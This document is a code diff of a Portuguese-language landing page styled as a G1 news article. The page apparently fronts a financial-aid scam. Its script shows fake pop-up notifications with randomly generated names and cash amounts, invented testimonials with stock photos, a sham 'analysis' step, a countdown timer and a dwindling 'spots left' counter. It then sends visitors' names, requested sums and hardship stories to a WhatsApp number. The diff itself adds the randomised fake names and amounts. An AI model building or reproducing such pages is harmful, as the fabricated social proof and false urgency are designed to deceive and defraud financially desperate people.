@@ -9,7 +9,6 @@
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
         body { background: var(--bg); color: #222; overflow-x: hidden; }
 
-        /* HEADER G1 */
         header { background: var(--primary); padding: 12px 20px; display: flex; align-items: center; justify-content: space-between; position: sticky; top: 0; z-index: 1000; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
         .g1-logo { color: #fff; font-weight: 900; font-size: 26px; font-style: italic; letter-spacing: -2px; }
         .live-status { color: #fff; font-size: 11px; font-weight: 700; background: rgba(0,0,0,0.2); padding: 5px 12px; border-radius: 20px; display: flex; align-items: center; gap: 6px; }
@@ -18,41 +17,15 @@
 
         .container { max-width: 500px; margin: 0 auto; background: #fff; min-height: 100vh; position: relative; padding-bottom: 120px; }
 
-        /* NOTIFICAÇÕES - COM DESTAQUES SOLICITADOS */
-        #notif-stack { 
-            position: fixed; 
-            bottom: 120px; 
-            left: 15px; 
-            width: 85%; 
-            max-width: 320px; 
-            z-index: 9999; 
-            pointer-events: none; 
-        }
-        .notif-ios { 
-            background: rgba(255, 255, 255, 0.94); 
-            backdrop-filter: blur(20px); 
-            -webkit-backdrop-filter: blur(20px);
-            border-radius: 18px; 
-            padding: 12px; 
-            margin-bottom: 10px; 
-            display: flex; 
-            align-items: center; 
-            gap: 12px; 
-            box-shadow: 0 10px 25px rgba(0,0,0,0.15); 
-            border: 1px solid rgba(255,255,255,0.4); 
-            transform: translateX(-120%); 
-            transition: 0.8s cubic-bezier(0.175, 0.885, 0.32, 1.275); 
-        }
+        #notif-stack { position: fixed; bottom: 120px; left: 15px; width: 85%; max-width: 320px; z-index: 9999; pointer-events: none; }
+        .notif-ios { background: rgba(255, 255, 255, 0.94); backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px); border-radius: 18px; padding: 12px; margin-bottom: 10px; display: flex; align-items: center; gap: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.15); border: 1px solid rgba(255,255,255,0.4); transform: translateX(-120%); transition: 0.8s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
         .notif-ios.show { transform: translateX(0); }
-        .notif-ios img { width: 42px; height: 42px; border-radius: 10px; object-fit: cover; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
+        .notif-ios img { width: 42px; height: 42px; border-radius: 10px; object-fit: cover; }
         .n-info b { font-size: 13px; display: block; color: #111; margin-bottom: 1px; }
         .n-info span { font-size: 11px; color: #666; line-height: 1.2; display: block; }
-        
-        /* DESTAQUES ESPECÍFICOS */
-        .n-info i { color: #00a859; font-weight: 900; font-style: normal; font-size: 13px; text-shadow: 0px 0px 1px rgba(0,168,89,0.2); }
+        .n-info i { color: #00a859; font-weight: 900; font-style: normal; font-size: 13px; }
         .city-bold { color: #000; font-weight: 800; }
 
-        /* CONTEÚDO STORYTELLING */
         .article { padding: 25px 20px; }
         .kicker { color: var(--primary); font-weight: 800; font-size: 12px; text-transform: uppercase; margin-bottom: 10px; display: block; }
         h1 { font-size: 28px; line-height: 1.1; font-weight: 900; color: #111; margin-bottom: 20px; letter-spacing: -1px; }
@@ -61,7 +34,6 @@
         .story-box p { margin-bottom: 18px; font-size: 16px; color: #333; line-height: 1.7; }
         .story-box b { color: #000; font-weight: 700; }
 
-        /* CARROSSEL */
         .testimonial-carousel { margin: 30px 0; background: #f0f2f5; padding: 25px 15px; border-radius: 25px; }
         .t-header { font-weight: 800; text-align: center; margin-bottom: 20px; font-size: 18px; color: #1c1e21; }
         .track-container { overflow: hidden; position: relative; border-radius: 15px; }
@@ -75,7 +47,6 @@
         .u-val { margin-left: auto; background: #e8f5e9; color: #2e7d32; font-weight: 900; font-size: 13px; padding: 5px 12px; border-radius: 20px; }
         .u-txt { font-size: 14px; color: #444; font-style: italic; line-height: 1.5; }
 
-        /* MODAL */
         .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); backdrop-filter: blur(10px); z-index: 10000; display: none; align-items: center; justify-content: center; padding: 20px; }
         .step-box { background: #fff; width: 100%; max-width: 400px; border-radius: 30px; padding: 35px; text-align: center; box-shadow: 0 25px 50px rgba(0,0,0,0.3); }
         .step { display: none; }
@@ -90,7 +61,6 @@
         .btn-go { background: var(--primary); color: #fff; border: none; width: 100%; padding: 20px; border-radius: 15px; font-weight: 800; font-size: 16px; cursor: pointer; }
         .btn-wpp { background: var(--accent); color: #fff; border: none; width: 100%; padding: 20px; border-radius: 15px; font-weight: 900; font-size: 16px; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px; }
 
-        /* FOOTER */
         .footer-action { position: fixed; bottom: 0; left: 0; width: 100%; background: #fff; padding: 20px; border-top: 1px solid #eee; text-align: center; z-index: 900; }
         .main-cta { background: var(--accent); color: #fff; padding: 18px; border-radius: 50px; text-decoration: none; display: block; font-weight: 900; font-size: 18px; animation: float 2s infinite; box-shadow: 0 10px 20px rgba(37,211,102,0.3); }
         @keyframes float { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-5px); } }
@@ -173,55 +143,21 @@
             initNotifs();
         });
 
-    function showModal() { document.getElementById('modal').style.display = 'flex'; }
-    function go(n) {
-        document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
-        document.getElementById('s'+n).classList.add('active');
-    }
-
-    function startAnalysis() {
-        go('_loading');
-        const bar = document.getElementById('l_b');
-        setTimeout(() => { bar.style.width = "100%"; }, 100);
-        setTimeout(() => { 
-            go(3); 
-            startTimer(300, document.getElementById('timer'));
-        }, 3200);
-    }
-
-    function formatMoney(v) {
-        let n = v.replace(/\D/g, "");
-        if (n === "") return "R$ 0,00";
-        return "R$ " + (parseFloat(n)).toLocaleString('pt-BR');
-    }
-
-    function startTimer(duration, display) {
-        let timer = duration, m, s;
-        setInterval(() => {
-            m = parseInt(timer / 60, 10); s = parseInt(timer % 60, 10);
-            display.textContent = (m < 10 ? "0"+m : m) + ":" + (s < 10 ? "0"+s : s);
-            if (--timer < 0) timer = 0;
-        }, 1000);
-    }
-
-    function finish() {
-        const n = document.getElementById('in_nome').value;
-        const v = formatMoney(document.getElementById('in_valor').value);
-        const h = document.getElementById('in_historia').value;
-        const msg = `Olá Monaia, fui uma das 6 pessoas selecionadas para a ajuda de hoje! 🙏\n\n📌 *DADOS DO MEU PERFIL:*\n👤 *Nome:* ${n}\n💰 *Valor solicitado:* ${v}\n\n📝 *MINHA HISTÓRIA:*\n"${h}"\n\noq devo fazer pra receber minha ajuda agora e ser abençoado?`;
-        window.location.href = `https://api.whatsapp.com/send?phone=5581995850167&text=${encodeURIComponent(msg)}`;
-    }
+    const homens = ["Ricardo S.", "Marcos O.", "Felipe M.", "Tiago G.", "Paulo B.", "Lucas V.", "André L.", "João P.", "Gustavo H.", "Bruno C."];
+    const mulheres = ["Sandra R.", "Lúcia M.", "Fabiana L.", "Beatriz V.", "Elena P.", "Amanda K.", "Carla F.", "Juliana T.", "Renata M.", "Fernanda S."];
+    const fotosH = [1, 3, 7, 11, 12, 13, 14, 15, 18, 59];
+    const fotosM = [2, 5, 6, 9, 10, 16, 20, 22, 26, 32];
 
     const depoimentos = [
-        {n:'Ricardo S.', c:'SP', v:'R$ 5.000', t:'Paguei o agiota que me ameaçava.', i:'https://i.pravatar.cc/150?u=1'},
-        {n:'Marcos Uber', c:'MG', v:'R$ 10.000', t:'Consertei o carro pra voltar a rodar.', i:'https://i.pravatar.cc/150?u=3'},
-        {n:'Sandra R.', c:'CE', v:'R$ 3.500', t:'Paguei os remédios da minha mãe.', i:'https://i.pravatar.cc/150?u=6'},
-        {n:'Lúcia M.', c:'RJ', v:'R$ 2.800', t:'Quitei minha luz e aluguel.', i:'https://i.pravatar.cc/150?u=2'}
+        {n:'Ricardo S.', g:'h', v:'R$ 5.000', t:'Paguei o agiota que me ameaçava.', i:'https://i.pravatar.cc/150?u=11'},
+        {n:'Marcos Uber', g:'h', v:'R$ 10.000', t:'Consertei o carro pra voltar a rodar.', i:'https://i.pravatar.cc/150?u=13'},
+        {n:'Sandra R.', g:'m', v:'R$ 3.500', t:'Paguei os remédios da minha mãe.', i:'https://i.pravatar.cc/150?u=10'},
+        {n:'Lúcia M.', g:'m', v:'R$ 2.800', t:'Quitei minha luz e aluguel.', i:'https://i.pravatar.cc/150?u=16'}
     ];
 
     const track = document.getElementById('track');
     depoimentos.forEach(d => {
-        track.innerHTML += `<div class="slide"><div class="slide-inner"><div class="u-meta"><img src="${d.i}" class="u-img"><div class="u-name"><b>${d.n}</b><span>${d.c}</span></div><div class="u-val">${d.v}</div></div><p class="u-txt">"${d.t}"</p></div></div>`;
+        track.innerHTML += `<div class="slide"><div class="slide-inner"><div class="u-meta"><img src="${d.i}" class="u-img"><div class="u-name"><b>${d.n}</b><span>Sua Região</span></div><div class="u-val">${d.v}</div></div><p class="u-txt">"${d.t}"</p></div></div>`;
     });
 
     let slide = 0;
@@ -230,10 +166,14 @@
     function initNotifs() {
         const stack = document.getElementById('notif-stack');
         function show() {
-            const d = depoimentos[Math.floor(Math.random()*depoimentos.length)];
+            const isHomem = Math.random() > 0.5;
+            const nome = isHomem ? homens[Math.floor(Math.random()*homens.length)] : mulheres[Math.floor(Math.random()*mulheres.length)];
+            const fotoId = isHomem ? fotosH[Math.floor(Math.random()*fotosH.length)] : fotosM[Math.floor(Math.random()*fotosM.length)];
+            const valor = "R$ " + (Math.floor(Math.random() * (12000 - 1500) + 1500)).toLocaleString('pt-BR');
+            
             const el = document.createElement('div');
             el.className = 'notif-ios';
-            el.innerHTML = `<img src="${d.i}"><div class="n-info"><b>${d.n} foi selecionado(a)!</b><span>Recebeu <i>${d.v}</i> em <span class="city-bold">${local}</span></span></div>`;
+            el.innerHTML = `<img src="https://i.pravatar.cc/150?img=${fotoId}"><div class="n-info"><b>${nome} foi selecionado(a)!</b><span>Recebeu <i>${valor}</i> em <span class="city-bold">${local}</span></span></div>`;
             stack.appendChild(el);
             setTimeout(() => el.classList.add('show'), 100);
             setTimeout(() => { el.classList.remove('show'); setTimeout(()=>el.remove(), 800); }, 5000);
@@ -242,9 +182,33 @@
         setTimeout(show, 1500);
     }
 
+    function showModal() { document.getElementById('modal').style.display = 'flex'; }
+    function go(n) {
+        document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+        document.getElementById('s'+n).classList.add('active');
+    }
+    function startAnalysis() {
+        go('_loading');
+        setTimeout(() => { document.getElementById('l_b').style.width = "100%"; }, 100);
+        setTimeout(() => { go(3); startTimer(300, document.getElementById('timer')); }, 3200);
+    }
+    function startTimer(duration, display) {
+        let timer = duration, m, s;
+        setInterval(() => {
+            m = parseInt(timer / 60, 10); s = parseInt(timer % 60, 10);
+            display.textContent = (m < 10 ? "0"+m : m) + ":" + (s < 10 ? "0"+s : s);
+            if (--timer < 0) timer = 0;
+        }, 1000);
+    }
+    function finish() {
+        const n = document.getElementById('in_nome').value;
+        const v = document.getElementById('in_valor').value;
+        const h = document.getElementById('in_historia').value;
+        const msg = `Olá Monaia, fui uma das 6 pessoas selecionadas para a ajuda de hoje! 🙏\n\n📌 *DADOS DO MEU PERFIL:*\n👤 *Nome:* ${n}\n💰 *Valor solicitado:* R$ ${v}\n\n📝 *MINHA HISTÓRIA:*\n"${h}"\n\noq devo fazer pra receber minha ajuda agora?`;
+        window.location.href = `https://api.whatsapp.com/send?phone=5581995850167&text=${encodeURIComponent(msg)}`;
+    }
     let vc = 6;
     setInterval(() => { if(vc > 1) { vc--; document.getElementById('v-count').innerText = vc; } }, 45000);
 </script>
-
 </body>
 </html>
